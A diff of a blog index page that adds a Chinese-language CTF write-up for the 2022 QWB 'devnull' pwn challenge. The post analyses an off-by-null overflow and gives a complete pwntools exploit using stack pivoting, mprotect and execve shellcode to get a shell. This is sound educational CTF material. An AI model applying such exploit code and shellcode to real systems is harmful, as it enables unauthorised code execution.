@@ -246,6 +246,142 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://zsy-arch.github.io/2025/03/19/PWN-%E5%BC%BA%E7%BD%91%E6%9D%AF-2022-devnull-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zzzzz">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2025/03/19/PWN-%E5%BC%BA%E7%BD%91%E6%9D%AF-2022-devnull-writeup/" itemprop="url">PWN - [强网杯 2022]devnull writeup</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2025-03-19T13:49:37+08:00">
+                2025-03-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>首先查看文件信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3f4000)</span><br></pre></td></tr></table></figure>
+
+<p>使用IDA打开程序，发现程序核心逻辑如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40138F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+24h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_401356(<span class="string">&quot;/deb/null may cause some error\n&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  fd = dword_404028;</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401356(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  buf = <span class="built_in">malloc</span>(dword_404010);</span><br><span class="line">  sub_401356(<span class="string">&quot;please input your filename\n&quot;</span>);</span><br><span class="line">  fgets(s, n, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_401356(<span class="string">&quot;Please write the data you want to discard\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(fd, &amp;v3, dword_404014) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4012B6();</span><br><span class="line">    sub_401356(<span class="string">&quot;please input your new data\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !read(fd, buf, dword_404010) )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    sub_401356(<span class="string">&quot;Thanks\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> close(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_401356(<span class="string">&quot;no junk data?\n&quot;</span>);</span><br><span class="line">    sub_401356(<span class="string">&quot;please input your new data\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, dword_404010);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_4012E0(s, (<span class="keyword">const</span> <span class="keyword">char</span> *)buf);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先，<code>fgets(s, n, stdin)</code>处存在off-by-null的栈溢出，可以使得fd最后一个字节为0：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000404014 dword_404014    dd 2Ch                  ; DATA XREF: sub_40138F+B6↑r</span><br><span class="line">.data:0000000000404018 ; int n</span><br><span class="line">.data:0000000000404018 n               dd 21h                  ; DATA XREF: sub_40138F+93↑r</span><br><span class="line">.data:000000000040401C                 align 20h</span><br></pre></td></tr></table></figure>
+
+<p>那么<code>if ( read(fd, &amp;v3, dword_404014) )</code>处则为true，可以从<code>&amp;v3</code>处写入2C字节的数据，从而控制<code>buf</code>的地址，进而控制程序流。</p>
+<p>在上述if内部还存在<code>if ( !read(fd, buf, dword_404010) )</code>，我们可以依靠其与<code>buf</code>进行任意地址写。</p>
+<p>由于2C字节的限制，我们尝试进行栈迁移，并利用mprotect进而执行shellcode。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./devnull&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *0x401436\nc&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># off-by-null -&gt; fd = 0</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;please input your filename\n&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x401513</span></span><br><span class="line"><span class="comment"># mov rax, [rbp-0x18]; leave; ret</span></span><br><span class="line">leave_ret = <span class="number">0x401350</span></span><br><span class="line"><span class="comment"># leave_ret = 0x401511</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">mprotect_ret = <span class="number">0x4012d0</span></span><br><span class="line"></span><br><span class="line">rw_seg = <span class="number">0x3FF000</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p64(rw_seg) + p64(rw_seg + <span class="number">0x18</span>) + p64(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">b&quot;Please write the data you want to discard\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;mov rax, 0x3b; mov rdi, 0x3ff008; mov rsi, 0; mov rdx, 0; syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload2 += p64(rw_seg)</span><br><span class="line">payload2 += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload2 += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment"># &gt;&gt;&gt; (rw_seg + 0x18)</span></span><br><span class="line">payload2 += p64(rw_seg + <span class="number">0x60</span>)</span><br><span class="line"><span class="comment"># payload2 += p64(0xdeadbeef)</span></span><br><span class="line">payload2 += p64(mprotect_ret)</span><br><span class="line">payload2 += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload2 += p64(rw_seg + <span class="number">0x40</span>)</span><br><span class="line">payload2 += p64(ret)</span><br><span class="line">payload2 += shellcode</span><br><span class="line"><span class="comment"># &gt;&gt;&gt; (rw_seg + 0x60)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please input your new data\n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<img src="/2025/03/19/PWN-%E5%BC%BA%E7%BD%91%E6%9D%AF-2022-devnull-writeup/Snipaste_2025-03-19_13-59-29.png" class="" title="get shell">
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://zsy-arch.github.io/2025/03/18/NSSCTF-PWN-SUCTF-2018-%E6%8B%9B%E6%96%B0%E8%B5%9B-unlink-writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3865,125 +4001,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://zsy-arch.github.io/2021/12/30/2021-2022-CTF%E5%AF%92%E5%81%87%E8%AE%AD%E7%BB%83Week1-12-27-1-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zzzzz">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/12/30/2021-2022-CTF%E5%AF%92%E5%81%87%E8%AE%AD%E7%BB%83Week1-12-27-1-2/" itemprop="url">2021-2022 CTF寒假训练Week1-12/27-1/2</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-12-30T13:43:51+08:00">
-                2021-12-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="android-app-100"><a href="#android-app-100" class="headerlink" title="android-app-100"></a>android-app-100</h2><h2 id="Reversing-x64Elf-100"><a href="#Reversing-x64Elf-100" class="headerlink" title="Reversing-x64Elf-100"></a>Reversing-x64Elf-100</h2><h2 id="ReverseMe-120"><a href="#ReverseMe-120" class="headerlink" title="ReverseMe-120"></a>ReverseMe-120</h2><h2 id="re2-cpp-is-awesome"><a href="#re2-cpp-is-awesome" class="headerlink" title="re2-cpp-is-awesome"></a>re2-cpp-is-awesome</h2><h2 id="serial-150"><a href="#serial-150" class="headerlink" title="serial-150"></a>serial-150</h2>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -4034,7 +4051,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">68</span>
+                  <span class="site-state-item-count">69</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
